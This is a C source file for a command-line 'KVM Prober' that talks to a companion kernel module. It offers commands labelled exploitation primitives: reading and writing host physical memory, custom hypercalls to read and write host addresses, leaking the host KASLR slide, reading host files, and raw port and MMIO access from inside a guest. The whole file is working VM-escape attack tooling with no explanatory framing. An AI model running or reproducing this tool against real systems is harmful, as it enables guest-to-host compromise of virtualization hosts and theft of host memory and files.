#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <errno.h>
#include <inttypes.h>

#define DEVICE_PATH "/dev/kvm_probe_dev"
#define DEVICE_PATH_ALT "/dev/kvm_probe_drv"

// IOCTL definitions
#define IOCTL_READ_PORT          0x1001
#define IOCTL_WRITE_PORT         0x1002
#define IOCTL_READ_MMIO          0x1003
#define IOCTL_WRITE_MMIO         0x1004
#define IOCTL_TRIGGER_HYPERCALL  0x1008
#define IOCTL_READ_KERNEL_MEM    0x1009
#define IOCTL_WRITE_KERNEL_MEM   0x100A
#define IOCTL_GET_KASLR_SLIDE    0x100E
#define IOCTL_VIRT_TO_PHYS       0x100F
#define IOCTL_HYPERCALL_ARGS     0x1012
#define IOCTL_READ_FILE          0x1013
#define IOCTL_READ_GPA           0x1014
#define IOCTL_WRITE_GPA          0x1015
#define IOCTL_PHYS_TO_VIRT       0x1018
#define IOCTL_READ_HPA           0x1019
#define IOCTL_WRITE_HPA          0x101A

struct port_io_data {
    unsigned short port;
    unsigned int size;
    unsigned int value;
};

struct mmio_data {
    unsigned long phys_addr;
    unsigned long size;
    unsigned char *user_buffer;
    unsigned long single_value;
    unsigned int value_size;
};

struct gpa_io_data {
    unsigned long gpa;
    unsigned long size;
    unsigned char *user_buffer;
};

struct hpa_io_data {
    unsigned long hpa;
    unsigned long size;
    unsigned char *user_buffer;
};

struct file_read_request {
    char *path;
    unsigned long offset;
    size_t length;
    void *user_buffer;
};

struct hypercall_args {
    unsigned long nr;
    unsigned long arg0;
    unsigned long arg1;
    unsigned long arg2;
    unsigned long arg3;
    long ret_value;  // Return value from hypercall
};

// Helper: Get guest physical address from virtual
unsigned long virt_to_phys_guest(int fd, void *virt_addr) {
    unsigned long virt = (unsigned long)virt_addr;
    unsigned long phys = virt;
    
    if (ioctl(fd, IOCTL_VIRT_TO_PHYS, &phys) < 0) {
        perror("virt_to_phys failed");
        return 0;
    }
    
    return phys;
}

void print_usage(char *prog_name) {
    fprintf(stderr, "KVM Prober - FINAL VERSION (Hypercall Buffer Support)\n\n");
    fprintf(stderr, "Usage: %s <command> [args...]\n\n", prog_name);
    
    fprintf(stderr, "=== GUEST Memory Operations (Guest Physical Address) ===\n");
    fprintf(stderr, "  readgpa <gpa_hex> <num_bytes>        - Read GUEST physical memory\n");
    fprintf(stderr, "  writegpa <gpa_hex> <hex_string>      - Write GUEST physical memory\n\n");
    
    fprintf(stderr, "=== HOST Memory Operations (Host Physical Address) ===\n");
    fprintf(stderr, "  readhpa <hpa_hex> <num_bytes>        - Read HOST physical (ioremap)\n");
    fprintf(stderr, "  writehpa <hpa_hex> <hex_string>      - Write HOST physical (ioremap)\n\n");
    
    fprintf(stderr, "=== MMIO/BAR Operations (Hardware/IVSHMEM Access) ===\n");
    fprintf(stderr, "  readmmio_val <addr_hex> <size>       - Read MMIO value\n");
    fprintf(stderr, "  writemmio_val <addr_hex> <val> <sz>  - Write MMIO value\n");
    fprintf(stderr, "  readmmio_buf <addr_hex> <num_bytes>  - Read MMIO buffer\n");
    fprintf(stderr, "  writemmio_buf <addr_hex> <hex_str>   - Write MMIO buffer\n\n");
    
    fprintf(stderr, "=== I/O Port Operations ===\n");
    fprintf(stderr, "  readport <port_hex> <size>           - Read I/O port\n");
    fprintf(stderr, "  writeport <port_hex> <val> <size>    - Write I/O port\n\n");
    
    fprintf(stderr, "=== Hypercall Operations (UPDATED) ===\n");
    fprintf(stderr, "  hypercall <nr> <a0> <a1> <a2> <a3>   - Execute hypercall (returns rax)\n");
    fprintf(stderr, "  hypercall_read <host_addr> <size>    - Read from HOST via hypercall\n");
    fprintf(stderr, "  hypercall_write <host_addr> <value>  - Write to HOST via hypercall\n\n");
    
    fprintf(stderr, "=== Exploitation Primitives ===\n");
    fprintf(stderr, "  readfile <path> <offset> <length>    - Read HOST file (RCE)\n");
    fprintf(stderr, "  getkaslr                             - Get host KASLR slide\n\n");
    
    fprintf(stderr, "=== Address Translation ===\n");
    fprintf(stderr, "  virt2phys <virt_addr_hex>            - Virtual to physical (guest)\n");
    fprintf(stderr, "  phys2virt <phys_addr_hex>            - Physical to virtual (guest)\n\n");
    
    fprintf(stderr, "KEY CONCEPTS:\n");
    fprintf(stderr, "  GPA = Guest Physical Address (guest's own memory)\n");
    fprintf(stderr, "  HPA = Host Physical Address (actual host RAM - for exploitation)\n");
    fprintf(stderr, "  MMIO = Memory-Mapped I/O (hardware/BARs, may access host via IVSHMEM)\n\n");
    
    fprintf(stderr, "HYPERCALL PROTOCOL:\n");
    fprintf(stderr, "  Hypercall 100 (WRITE): nr=100, arg0=host_addr, arg1=value\n");
    fprintf(stderr, "  Hypercall 101 (READ):  nr=101, arg0=host_addr, arg1=guest_buffer_gpa, arg2=size\n");
    fprintf(stderr, "  Return value (rax) = status/bytes processed\n\n");
    
    fprintf(stderr, "EXPLOITATION NOTE:\n");
    fprintf(stderr, "  Hypercalls must use guest buffers for data transfer!\n");
    fprintf(stderr, "  Host can't return pointers - use guest GPA as destination buffer\n");
}

unsigned char *hex_string_to_bytes(const char *hex_str, unsigned long *num_bytes) {
    size_t len = strlen(hex_str);
    if (len % 2 != 0) {
        fprintf(stderr, "Hex string must have even number of characters.\n");
        return NULL;
    }
    *num_bytes = len / 2;
    unsigned char *bytes = (unsigned char *)malloc(*num_bytes);
    if (!bytes) {
        perror("malloc");
        return NULL;
    }
    for (size_t i = 0; i < *num_bytes; ++i) {
        if (sscanf(hex_str + 2 * i, "%2hhx", &bytes[i]) != 1) {
            fprintf(stderr, "Invalid hex character\n");
            free(bytes);
            return NULL;
        }
    }
    return bytes;
}

int open_device(void) {
    int fd = open(DEVICE_PATH, O_RDWR);
    if (fd < 0) {
        fd = open(DEVICE_PATH_ALT, O_RDWR);
    }
    return fd;
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        print_usage(argv[0]);
        return 1;
    }
    
    int fd = open_device();
    if (fd < 0) {
        perror("Failed to open device. Is the kernel module loaded?");
        return 1;
    }
    
    char *cmd = argv[1];

    // ===== GUEST Physical Address (GPA) Operations =====
    if (strcmp(cmd, "readgpa") == 0) {
        if (argc != 4) { print_usage(argv[0]); close(fd); return 1; }
        struct gpa_io_data data = {0};
        data.gpa = strtoul(argv[2], NULL, 16);
        data.size = strtoul(argv[3], NULL, 10);
        if (data.size == 0 || data.size > 4096) {
            fprintf(stderr, "Invalid size (1-4096)\n");
            close(fd);
            return 1;
        }
        data.user_buffer = malloc(data.size);
        if (!data.user_buffer) {
            perror("malloc");
            close(fd);
            return 1;
        }
        if (ioctl(fd, IOCTL_READ_GPA, &data) < 0)
            perror("ioctl READ_GPA failed");
        else {
            printf("Read %lu bytes from GUEST physical 0x%lX:\n", data.size, data.gpa);
            for (unsigned long i = 0; i < data.size; ++i) {
                printf("%02X", data.user_buffer[i]);
                if ((i + 1) % 16 == 0) printf("\n");
            }
            printf("\n");
        }
        free(data.user_buffer);

    } else if (strcmp(cmd, "writegpa") == 0) {
        if (argc != 4) { print_usage(argv[0]); close(fd); return 1; }
        struct gpa_io_data data = {0};
        data.gpa = strtoul(argv[2], NULL, 16);
        unsigned long num_bytes = 0;
        data.user_buffer = hex_string_to_bytes(argv[3], &num_bytes);
        data.size = num_bytes;
        if (!data.user_buffer) {
            close(fd);
            return 1;
        }
        if (ioctl(fd, IOCTL_WRITE_GPA, &data) < 0)
            perror("ioctl WRITE_GPA failed");
        else
            printf("Wrote %lu bytes to GUEST physical 0x%lX\n", data.size, data.gpa);
        free(data.user_buffer);

    // ===== HOST Physical Address (HPA) Operations =====
    } else if (strcmp(cmd, "readhpa") == 0) {
        if (argc != 4) { print_usage(argv[0]); close(fd); return 1; }
        struct hpa_io_data data = {0};
        data.hpa = strtoul(argv[2], NULL, 16);
        data.size = strtoul(argv[3], NULL, 10);
        if (data.size == 0 || data.size > 4096) {
            fprintf(stderr, "Invalid size (1-4096)\n");
            close(fd);
            return 1;
        }
        data.user_buffer = malloc(data.size);
        if (!data.user_buffer) {
            perror("malloc");
            close(fd);
            return 1;
        }
        printf("[*] Attempting to read HOST physical 0x%lX (may fail if not accessible)...\n", data.hpa);
        if (ioctl(fd, IOCTL_READ_HPA, &data) < 0) {
            perror("ioctl READ_HPA failed - Host memory not accessible via ioremap");
        } else {
            printf("[+] Read %lu bytes from HOST physical 0x%lX:\n", data.size, data.hpa);
            for (unsigned long i = 0; i < data.size; ++i) {
                printf("%02X", data.user_buffer[i]);
                if ((i + 1) % 16 == 0) printf("\n");
            }
            printf("\n");
        }
        free(data.user_buffer);

    } else if (strcmp(cmd, "writehpa") == 0) {
        if (argc != 4) { print_usage(argv[0]); close(fd); return 1; }
        struct hpa_io_data data = {0};
        data.hpa = strtoul(argv[2], NULL, 16);
        unsigned long num_bytes = 0;
        data.user_buffer = hex_string_to_bytes(argv[3], &num_bytes);
        data.size = num_bytes;
        if (!data.user_buffer) {
            close(fd);
            return 1;
        }
        printf("[*] Attempting to write to HOST physical 0x%lX...\n", data.hpa);
        if (ioctl(fd, IOCTL_WRITE_HPA, &data) < 0) {
            perror("ioctl WRITE_HPA failed - Host memory not accessible via ioremap");
        } else {
            printf("[+] Wrote %lu bytes to HOST physical 0x%lX\n", data.size, data.hpa);
        }
        free(data.user_buffer);

    // ===== MMIO Operations =====
    } else if (strcmp(cmd, "readmmio_buf") == 0) {
        if (argc != 4) { print_usage(argv[0]); close(fd); return 1; }
        struct mmio_data data = {0};
        data.phys_addr = strtoul(argv[2], NULL, 16);
        data.size = strtoul(argv[3], NULL, 10);
        if (data.size == 0 || data.size > 65536) {
            fprintf(stderr, "Invalid size (max 64K)\n");
            close(fd);
            return 1;
        }
        data.user_buffer = malloc(data.size);
        if (!data.user_buffer) {
            perror("malloc");
            close(fd);
            return 1;
        }
        if (ioctl(fd, IOCTL_READ_MMIO, &data) < 0)
            perror("ioctl READ_MMIO failed");
        else {
            printf("Read %lu bytes from MMIO 0x%lX:\n", data.size, data.phys_addr);
            for (unsigned long i = 0; i < data.size; ++i) {
                printf("%02X", data.user_buffer[i]);
                if ((i + 1) % 16 == 0) printf("\n");
            }
            printf("\n");
        }
        free(data.user_buffer);

    } else if (strcmp(cmd, "writemmio_buf") == 0) {
        if (argc != 4) { print_usage(argv[0]); close(fd); return 1; }
        struct mmio_data data = {0};
        data.phys_addr = strtoul(argv[2], NULL, 16);
        unsigned long num_bytes = 0;
        data.user_buffer = hex_string_to_bytes(argv[3], &num_bytes);
        data.size = num_bytes;
        if (!data.user_buffer) {
            close(fd);
            return 1;
        }
        if (ioctl(fd, IOCTL_WRITE_MMIO, &data) < 0)
            perror("ioctl WRITE_MMIO failed");
        else
            printf("Wrote %lu bytes to MMIO 0x%lX\n", data.size, data.phys_addr);
        free(data.user_buffer);

    } else if (strcmp(cmd, "writemmio_val") == 0) {
        if (argc != 5) { print_usage(argv[0]); close(fd); return 1; }
        struct mmio_data data = {0};
        data.phys_addr = strtoul(argv[2], NULL, 16);
        data.single_value = strtoul(argv[3], NULL, 16);
        data.value_size = (unsigned int)strtoul(argv[4], NULL, 10);
        data.size = 0;
        if (ioctl(fd, IOCTL_WRITE_MMIO, &data) < 0)
            perror("ioctl WRITE_MMIO failed");
        else
            printf("Wrote 0x%lX to MMIO 0x%lX (size %u)\n", data.single_value, data.phys_addr, data.value_size);

    // ===== I/O Port Operations =====
    } else if (strcmp(cmd, "readport") == 0) {
        if (argc != 4) { print_usage(argv[0]); close(fd); return 1; }
        struct port_io_data data;
        data.port = (unsigned short)strtoul(argv[2], NULL, 16);
        data.size = (unsigned int)strtoul(argv[3], NULL, 10);
        if (ioctl(fd, IOCTL_READ_PORT, &data) < 0)
            perror("ioctl READ_PORT failed");
        else
            printf("Port 0x%X: 0x%X\n", data.port, data.value);

    } else if (strcmp(cmd, "writeport") == 0) {
        if (argc != 5) { print_usage(argv[0]); close(fd); return 1; }
        struct port_io_data data;
        data.port = (unsigned short)strtoul(argv[2], NULL, 16);
        data.value = (unsigned int)strtoul(argv[3], NULL, 16);
        data.size = (unsigned int)strtoul(argv[4], NULL, 10);
        if (ioctl(fd, IOCTL_WRITE_PORT, &data) < 0)
            perror("ioctl WRITE_PORT failed");
        else
            printf("Wrote 0x%X to port 0x%X\n", data.value, data.port);

    // ===== Hypercall Operations (UPDATED) =====
    } else if (strcmp(cmd, "hypercall") == 0) {
        if (argc != 7) { print_usage(argv[0]); close(fd); return 1; }
        struct hypercall_args args;
        args.nr = strtoul(argv[2], NULL, 0);
        args.arg0 = strtoul(argv[3], NULL, 0);
        args.arg1 = strtoul(argv[4], NULL, 0);
        args.arg2 = strtoul(argv[5], NULL, 0);
        args.arg3 = strtoul(argv[6], NULL, 0);
        args.ret_value = 0;
        
        if (ioctl(fd, IOCTL_HYPERCALL_ARGS, &args) < 0)
            perror("ioctl HYPERCALL_ARGS failed");
        else
            printf("Hypercall %lu executed\n  rax (return) = %ld (0x%lx)\n", 
                   args.nr, args.ret_value, args.ret_value);

    } else if (strcmp(cmd, "hypercall_read") == 0) {
        if (argc != 4) { print_usage(argv[0]); close(fd); return 1; }
        
        unsigned long host_addr = strtoul(argv[2], NULL, 16);
        unsigned long size = strtoul(argv[3], NULL, 10);
        
        if (size == 0 || size > 4096) {
            fprintf(stderr, "Invalid size (1-4096)\n");
            close(fd);
            return 1;
        }
        
        // Allocate guest buffer
        unsigned char *guest_buffer = malloc(size);
        if (!guest_buffer) {
            perror("malloc");
            close(fd);
            return 1;
        }
        
        // Get guest physical address of buffer
        unsigned long guest_gpa = virt_to_phys_guest(fd, guest_buffer);
        if (!guest_gpa) {
            fprintf(stderr, "Failed to get GPA of guest buffer\n");
            free(guest_buffer);
            close(fd);
            return 1;
        }
        
        printf("[*] Hypercall READ from HOST 0x%lX to guest buffer @ GPA 0x%lX\n", 
               host_addr, guest_gpa);
        
        // Execute hypercall: READ (nr=101)
        struct hypercall_args args;
        args.nr = 101;
        args.arg0 = host_addr;        // Host physical address to read
        args.arg1 = guest_gpa;         // Guest buffer (as GPA)
        args.arg2 = size;              // Size
        args.arg3 = 0;
        args.ret_value = 0;
        
        if (ioctl(fd, IOCTL_HYPERCALL_ARGS, &args) < 0) {
            perror("ioctl HYPERCALL_ARGS failed");
            free(guest_buffer);
            close(fd);
            return 1;
        }
        
        printf("[+] Hypercall returned: %ld bytes\n", args.ret_value);
        
        if (args.ret_value > 0) {
            printf("[+] Data from host:\n");
            for (long i = 0; i < args.ret_value && i < (long)size; ++i) {
                printf("%02X", guest_buffer[i]);
                if ((i + 1) % 16 == 0) printf("\n");
            }
            printf("\n");
            
            printf("[+] ASCII: ");
            for (long i = 0; i < args.ret_value && i < (long)size; ++i) {
                printf("%c", (guest_buffer[i] >= 32 && guest_buffer[i] < 127) ? guest_buffer[i] : '.');
            }
            printf("\n");
        }
        
        free(guest_buffer);

    } else if (strcmp(cmd, "hypercall_write") == 0) {
        if (argc != 4) { print_usage(argv[0]); close(fd); return 1; }
        
        unsigned long host_addr = strtoul(argv[2], NULL, 16);
        unsigned long value = strtoul(argv[3], NULL, 16);
        
        printf("[*] Hypercall WRITE 0x%lX to HOST 0x%lX\n", value, host_addr);
        
        // Execute hypercall: WRITE (nr=100)
        struct hypercall_args args;
        args.nr = 100;
        args.arg0 = host_addr;
        args.arg1 = value;
        args.arg2 = 0;
        args.arg3 = 0;
        args.ret_value = 0;
        
        if (ioctl(fd, IOCTL_HYPERCALL_ARGS, &args) < 0)
            perror("ioctl HYPERCALL_ARGS failed");
        else
            printf("[+] Hypercall returned: %ld (0x%lx)\n", args.ret_value, args.ret_value);

    // ===== Exploitation Primitives =====
    } else if (strcmp(cmd, "readfile") == 0) {
        if (argc != 5) { print_usage(argv[0]); close(fd); return 1; }
        struct file_read_request req;
        unsigned char *buffer = malloc(65536);
        if (!buffer) {
            perror("malloc");
            close(fd);
            return 1;
        }
        char *path = strdup(argv[2]);
        req.path = path;
        req.offset = strtoul(argv[3], NULL, 0);
        req.length = strtoul(argv[4], NULL, 0);
        req.user_buffer = buffer;
        
        if (ioctl(fd, IOCTL_READ_FILE, &req) < 0) {
            perror("ioctl READ_FILE failed");
        } else {
            printf("Read from %s:\n", path);
            fwrite(buffer, 1, req.length, stdout);
            printf("\n");
        }
        free(path);
        free(buffer);

    } else if (strcmp(cmd, "getkaslr") == 0) {
        unsigned long slide = 0;
        if (ioctl(fd, IOCTL_GET_KASLR_SLIDE, &slide) < 0)
            perror("ioctl GET_KASLR_SLIDE failed");
        else {
            printf("Host KASLR slide: 0x%lx\n", slide);
            printf("Host kernel base: 0x%lx\n", 0xffffffff81000000 + slide);
        }

    } else if (strcmp(cmd, "virt2phys") == 0) {
        if (argc != 3) { print_usage(argv[0]); close(fd); return 1; }
        unsigned long virt = strtoul(argv[2], NULL, 16);
        unsigned long phys = virt;
        if (ioctl(fd, IOCTL_VIRT_TO_PHYS, &phys) < 0)
            perror("ioctl VIRT_TO_PHYS failed");
        else
            printf("Virtual 0x%lx -> Physical 0x%lx (GUEST)\n", virt, phys);

    } else if (strcmp(cmd, "phys2virt") == 0) {
        if (argc != 3) { print_usage(argv[0]); close(fd); return 1; }
        unsigned long phys = strtoul(argv[2], NULL, 16);
        unsigned long virt = phys;
        if (ioctl(fd, IOCTL_PHYS_TO_VIRT, &virt) < 0)
            perror("ioctl PHYS_TO_VIRT failed");
        else
            printf("Physical 0x%lx -> Virtual 0x%lx (GUEST)\n", phys, virt);

    } else {
        fprintf(stderr, "Unknown command: %s\n", cmd);
        print_usage(argv[0]);
    }
    
    close(fd);
    return 0;
}